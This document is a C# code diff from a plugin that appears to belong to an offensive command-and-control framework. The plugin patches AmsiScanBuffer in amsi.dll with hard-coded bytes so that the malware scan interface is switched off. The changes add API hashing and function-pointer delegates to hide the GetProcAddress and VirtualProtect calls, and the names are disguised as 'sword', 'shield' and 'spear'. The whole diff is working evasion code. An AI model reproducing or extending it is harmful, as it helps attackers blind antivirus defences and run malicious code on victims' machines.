@@ -12,12 +12,22 @@ namespace Plugin
         static byte[] spear = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
 
 
+        const double LLHash = 61706584741;
+        const long GetProcAddrHash = 11604195004155;
+        const long VirtPro = 65467780416196;
+
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate IntPtr GPADelegate(IntPtr module, string procName);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
         [DllImport("kernel32")]
         public static extern IntPtr LoadLibrary(string name);
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        //[DllImport("kernel32")]
+        //public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        //[DllImport("kernel32")]
+        //public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         public static ResponseResult Execute(Dictionary<string, object> args)
         {
             try
@@ -72,6 +82,7 @@ namespace Plugin
             try
             {
                 byte[] bSword = new byte[] { 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c };
+
                 IntPtr pSword = LoadLibrary(Encoding.ASCII.GetString(bSword));
 
                 if (pSword == IntPtr.Zero)
@@ -81,14 +92,22 @@ namespace Plugin
 
 
                 byte[] bufSword = new byte[] { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };
-                IntPtr pShield = GetProcAddress(pSword, Encoding.ASCII.GetString(bufSword));
+
+                IntPtr ptrGPA = HInvoke.GetfuncaddressbyHash("kernel32.dll", GetProcAddrHash);
+                IntPtr ptrVP = HInvoke.GetfuncaddressbyHash("kernel32.dll", VirtPro);
+                //IntPtr pShield = GetProcAddress(pSword, Encoding.ASCII.GetString(bufSword));
+                GPADelegate gpa = (GPADelegate)Marshal.GetDelegateForFunctionPointer(ptrGPA, typeof(GPADelegate));
+
+                IntPtr pShield = gpa(pSword, Encoding.ASCII.GetString(bufSword));
+
                 if (pShield == IntPtr.Zero)
                 {
                     return false;
                 }
 
                 uint uCape;
-                if (!VirtualProtect(pShield, (UIntPtr)shield.Length, 0x40, out uCape))
+                VPDelegate ptrVPD = (VPDelegate)Marshal.GetDelegateForFunctionPointer(ptrVP, typeof(VPDelegate));
+                if (!ptrVPD(pShield, (UIntPtr)shield.Length, 0x40, out uCape))
                 {
                     return false;
                 }
